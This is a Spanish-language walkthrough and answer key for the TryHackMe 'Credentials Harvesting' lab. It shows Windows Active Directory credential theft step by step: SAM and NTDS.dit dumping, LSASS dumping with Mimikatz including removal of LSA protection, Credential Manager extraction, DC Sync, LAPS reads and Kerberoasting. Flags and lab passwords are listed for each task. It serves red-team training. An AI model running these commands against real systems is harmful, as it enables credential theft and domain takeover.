# Credentials Harvesting

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|---|---|---|---|---|---|---|---|
| Medium | Red Team · Active Directory · Credential Access | credentialsharvesting | https://tryhackme.com/room/credentialsharvesting | Credential Harvesting · Lateral Movement | TryHackMe | Windows Server 2019 (DC) · Mimikatz · Impacket | THM.red → Domain Admin |

---

**Contexto:** Sala Premium centrada en aplicar los modelos de autenticación modernos de entornos Active Directory con un enfoque red team. Se proporciona un Windows Server 2019 configurado como Domain Controller (THM.red) y una workstation (WRK), con acceso inicial por RDP como `thm`. El objetivo es aprender a obtener, reutilizar e impersonar credenciales: archivos en claro, registro, SAM, memoria (LSASS), Credential Manager, NTDS.dit, LAPS y ataques como Kerberoasting y AS-REP Roasting. Cada técnica se aplica sobre la máquina objetivo para extraer credenciales y moverse lateralmente.

## Solucionario

### Task 1: Introduction

**Explicación:** La sala introduce los conceptos de credential harvesting (obtención de credenciales de texto claro, hashes, tickets, etc.) y sus ventajas para un red team: movilidad lateral, menor detección y gestión de cuentas. Se recomienda completar los prerrequisitos (Active Directory Basics, Breaching AD, Enumerating AD, Lateral Movement and Pivoting).

Pregunta de preparación:

`No answer needed`

### Task 2: Credentials Harvesting

**Explicación:** Se explican los dos tipos de credential harvesting (externo e interno) y se proporcionan las credenciales de acceso a la máquina proporcionada (Windows Server 2019 como Domain Controller):

Machine IP: `MACHINE_IP` — Username: `thm` — Password: `Passw0rd!`

Acceso por RDP:

```
xfreerdp /v:10.10.76.132 /u:thm /p:'Passw0rd!'
```

Pregunta de arranque:

`No answer needed`

### Task 3: Credential Access

**Explicación:** Se enumeran las ubicaciones inseguras donde Windows guarda credenciales: archivos en claro, bases de datos, memoria, gestores de contraseñas, vaults empresariales, Active Directory y tráfico de red (MITRE ATT&CK TA0006). Como ejemplo, se busca la palabra clave "flag" en el registro de Windows con la herramienta reg query:

```
reg query HKLM /f flag /t REG_SZ /s
```

El resultado de la búsqueda en el registro es:

`7tyh4ckm3`

En cuanto a la enumeración AD, se usa:

```
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
```

La contraseña de la usuaria víctima se encuentra almacenada en su campo Description:

`Passw0rd!@#`

| # | Pregunta | Respuesta |
|---|---|---|
| 3.1 | Using the "reg query" command, search for the value of the "flag" keyword in the Windows registry? | `7tyh4ckm3` |
| 3.2 | Enumerate the AD environment we provided. What is the password of the victim user found in the description section? | `Passw0rd!@#` |

### Task 4: Local Windows Credentials

**Explicación:** Los detalles de las cuentas locales se almacenan en la SAM database. La SAM está cifrada (RC4/AES) y bloqueada mientras el sistema está en ejecución, pero se puede volcar con Metasploit's `hashdump`, Volume Shadow Copy (wmic + vssadmin) o volcando los hives del registro con `reg save`.

Método Volume Shadow Copy:

```
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\system C:\users\thm\Documents\system
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\sam C:\users\thm\Documents\sam
```

Método Registry Hives:

```
reg save HKLM\sam C:\Users\thm\Documents\sam-reg
reg save HKLM\system C:\Users\thm\Documents\system-reg
```

Copiamos ambos ficheros a la máquina atacante (scp) y los desciframos con Impacket SecretsDump:

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam -system system LOCAL
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam-reg -system system-reg LOCAL
```

El NTLM hash de la cuenta Administrator que se obtiene del volcado SAM es:

`98d3a787a80d08385cea7fb4aa2a4261`

| # | Pregunta | Respuesta |
|---|---|---|
| 4 | Follow the technique discussed in this task to dump the content of the SAM database file. What is the NTLM hash for the Administrator account? | `98d3a787a80d08385cea7fb4aa2a4261` |

### Task 5: Local Security Authority Subsystem Service (LSASS)

**Explicación:** LSASS almacena en memoria credenciales activas (NTLM, Kerberos). Con privilegios de administrador se puede volcar su memoria (Task Manager "Create dump file", ProcDump o Mimikatz) y extraer los hashes (T1003.001). Windows 2012+ protege LSASS con LSA Protection (RunAsPPL). En la máquina objetivo esa protección está habilitada.

Volcado con ProcDump:

```
procdump -ma lsass.exe lsass.dmp
```

Mimikatz contra el dump / en caliente:

```
C:\Tools\Mimikatz\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

Para desactivar la protección LSA (que produce error 0x00000005 Access Denied) se carga el driver mimidrv y se elimina la protección:

```
!+
!processprotect /process:lsass.exe /remove
privilege::debug
sekurlsa::logonpasswords
```

Respuesta a la pregunta sobre la protección:

`Y`

Una vez retirada la protección y volcada la memoria, la tarea se marca como completada.

`No answer needed`

| # | Pregunta | Respuesta |
|---|---|---|
| 5.1 | Is the LSA protection enabled? (Y\|N) | `Y` |
| 5.2 | If yes, try removing the protection and dumping the memory using Mimikatz. Once you have done, hit Complete. | `No answer needed` |

### Task 6: Windows Credential Manager

**Explicación:** Windows Credential Manager guarda credenciales web, de Windows, genéricas y basadas en certificados. Se enumeran los vaults con `vaultcmd`:

```
vaultcmd /list
VaultCmd /listcreds:"Web Credentials"
```

Para extraer las credenciales web se importa el script `Get-WebCredentials.ps1` (nishang) de la máquina víctima:

```
powershell -ex bypass
Import-Module C:\Tools\Get-WebCredentials.ps1
Get-WebCredentials
```

La contraseña del usuario THMuser para `internal-app.thm.red` es:

`E4syPassw0rd`

Para las credenciales del share SMB (10.10.237.226) guardadas en el vault de Windows se carga Mimikatz y se usa el módulo credman:

```
C:\Tools\Mimikatz\mimikatz.exe
privilege::debug
sekurlsa::credman
```

La contraseña del vault es:

`jfxKruLkkxoPjwe3`

Alternativamente, con `cmdkey /list` se detectan credenciales guardadas para `thm\thm-local` y con runas `/savecred` se abre un cmd.exe como ese usuario:

```
cmdkey /list
runas /savecred /user:THM.red\thm-local cmd.exe
```

Ese cmd apunta al usuario thm-local. Leyendo la flag en `c:\Users\thm-local\Saved Games\flag.txt`:

`THM{RunA5S4veCr3ds}`

| # | Pregunta | Respuesta |
|---|---|---|
| 6.1 | Apply the technique for extracting clear-text passwords from Windows Credential Manager. What is the password of the THMuser for internal-app.thm.red? | `E4syPassw0rd` |
| 6.2 | Use Mimikatz to memory dump the credentials for the 10.10.237.226 SMB share which is stored in the Windows Credential vault. What is the password? | `jfxKruLkkxoPjwe3` |
| 6.3 | Run cmd.exe under thm-local user via runas and read the flag in "c:\Users\thm-local\Saved Games\flag.txt". What is the flag? | `THM{RunA5S4veCr3ds}` |

### Task 7: Domain Controller

**Explicación:** NTDS.dit contiene toda la base de datos de AD (usuarios, atributos, credenciales) y está en `C:\Windows\NTDS`. Para volcarla localmente (sin credenciales, solo acceso administrativo al DC) se usa ntdsutil:

```
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

Se generan los tres ficheros necesarios en `C:\temp`: `Active Directory\ntds.dit`, `registry\SYSTEM` y `registry\SECURITY`. Se transfieren al AttackBox y se extraen los hashes de forma local con SecretsDump:

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -security ./temp/registry/SECURITY -system ./temp/registry/SYSTEM -ntds ./temp/'Active Directory'/ntds.dit local
```

El bootkey del sistema objetivo que aparece en la salida es:

`0x36c8d26ec0df8b23ce63bcefa6e2d821`

Para el volcado remoto con credenciales del dominio se realiza el ataque de DC Sync con el usuario con privilegios `thm.red/thm`:

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm THM.red/thm@10.10.1.129
```

El hash NTLM del usuario `bk-admin` se crackea con hashcat (modo 1000):

```
hashcat -m 1000 -a 0 077cccc23f8ab7031726a3b70c694a49 /usr/share/wordlists/rockyou.txt
```

La contraseña en texto claro es:

`Passw0rd123`

| # | Pregunta | Respuesta |
|---|---|---|
| 7.1 | Apply the technique discussed in this task to dump the NTDS file locally and extract hashes. What is the target system bootkey value? (Note: Use thm.red/thm as an Active Directory user since it has administrator privileges!) | `0x36c8d26ec0df8b23ce63bcefa6e2d821` |
| 7.2 | What is the clear-text password for the bk-admin username? | `Passw0rd123` |

### Task 8: Local Administrator Password Solution (LAPS)

**Explicación:** Con LAPS, la contraseña del administrador local se guarda en el atributo `ms-mcs-AdmPwd` de los objetos de equipo del AD (texto claro) y solo ciertos grupos pueden leerla. Se comprueba que LAPS está instalado:

```
dir "C:\Program Files\LAPS\CSE"
Get-Command *AdmPwd*
```

Se localiza el OU con los derechos extendidos sobre LAPS:

```
Find-AdmPwdExtendedRights -Identity *
Find-AdmPwdExtendedRights -Identity THMorg
```

Extiendo la búsqueda al grupo que tiene ExtendedRightHolder:

```
net groups "LAPsReader"
```

El grupo con ExtendedRightHolder capaz de leer la contraseña LAPS es:

`LAPsReader`

Con el usuario miembro de ese grupo se obtiene la contraseña del equipo habilitado para LAPS:

```
Get-AdmPwdPassword -ComputerName Creds-Harvestin
```

La LAPS password para el equipo Creds-Harvestin es:

`THMLAPSPassw0rd`

Y la cuenta que puede leer esas contraseñas es:

`bk-admin`

| # | Pregunta | Respuesta |
|---|---|---|
| 8.1 | Which group has ExtendedRightHolder and is able to read the LAPS password? | `LAPsReader` |
| 8.2 | Follow the technique discussed in this task to get the LAPS password. What is the LAPs Password for Creds-Harvestin computer? | `THMLAPSPassw0rd` |
| 8.3 | Which user is able to read LAPS passwords? | `bk-admin` |

### Task 9: Other Attacks

**Explicación:** Se introducen ataques AD para obtener hashes: Kerberoasting, AS-REP Roasting, SMB Relay y LLMNR/NBNS Poisoning. Con GetUserSPNs se enumeran cuentas SPN desde el AttackBox (THM.red/thm:Passw0rd!):

```
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.131.49 THM.red/thm
```

El Service Principal Name del Domain Controller es:

`svc-thm`

Con la cuenta SPN localizada, se solicita el TGS ticket y se crackea con hashcat (modo 13100):

```
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.131.49 THM.red/thm -request-user svc-thm
hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
```

La contraseña en texto claro del ticket TGS es:

`Passw0rd1`

| # | Pregunta | Respuesta |
|---|---|---|
| 9.1 | Enumerate for SPN users using the Impacket GetUserSPNs script. What is the Service Principal Name for the Domain Controller? | `svc-thm` |
| 9.2 | After finding the SPN account from the previous question, perform the Kerberoasting attack to grab the TGS ticket and crack it. What is the password? | `Passw0rd1` |

### Task 10: Conclusion

**Explicación:** Recapitulación de todas las técnicas vistas (SAM, LSASS, Credential Manager, NTDS/LAPS, Kerberoasting, AS-REP Roasting) y recomendación de herramientas de enumeración como Snaffler, Seatbelt y Lazagne. La sala finaliza con la pregunta de despedida.

`No answer needed`

---

**Metodología:** Red Team / Credential Access en entorno AD: acceso inicial por RDP → búsqueda de credenciales en registro (reg query) y fields AD (Description) → volcado de SAM (shadow copy + hives) con descifrado local → dump de LSASS (ProcDump/Mimikatz + desactivación de LSA Protection) → extracción del Credential Manager (vaultcmd, Get-WebCredentials, sekurlsa::credman, runas /savecred) → volcado local de NTDS.dit (ntdsutil ifm) y remoto (DC Sync) → enumeración y explotación de LAPS → Kerberoasting (GetUserSPNs + hashcat) y AS-REP Roasting.

**Learning chain:** xfreerdp → reg query (flag en registro) → Get-ADUser (password en Description) → wmic shadowcopy / vssadmin / reg save → secretsdump.py LOCAL → procdump -ma lsass → mimikatz (!+ / !processprotect / sekurlsa::logonpasswords) → vaultcmd / Get-WebCredentials / sekurlsa::credman → cmdkey + runas /savecred → ntdsutil 'ac i ntds' 'ifm' → secretsdump.py -ntds/-system/-security local → DC Sync (-just-dc-ntlm) → LAPS (Find-AdmPwdExtendedRights, Get-AdmPwdPassword) → GetUserSPNs + hashcat -m 13100.

**Lección:** *Windows y Active Directory guardan credenciales en múltiples ubicaciones (registro, SAM, memoria LSASS, Credential Manager, NTDS, LAPS). Ninguna por sí sola garantiza el dominio, pero combinarlas —de la workstation al Domain Controller— convierte un acceso local con administrador en control total del dominio sin necesidad de exploits.*

**MITRE ATT&CK:** T1003.001 (OS Credential Dumping: LSASS Memory), T1003.002 (Security Account Manager), T1003.003 (NTDS), T1003.005 (Cached Domain Credentials), T1555.004 (Credentials from Password Stores: Windows Credential Manager), T1552.001 (Unsecured Credentials: Credentials In Files / Registro), T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting), T1558.004 (AS-REP Roasting), T1078 (Valid Accounts), T1021.001 (Remote Services).

**Fuente:** [TryHackMe - Credentials Harvesting](https://tryhackme.com/room/credentialsharvesting)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos. **Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe. **Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto. **Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com). **Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.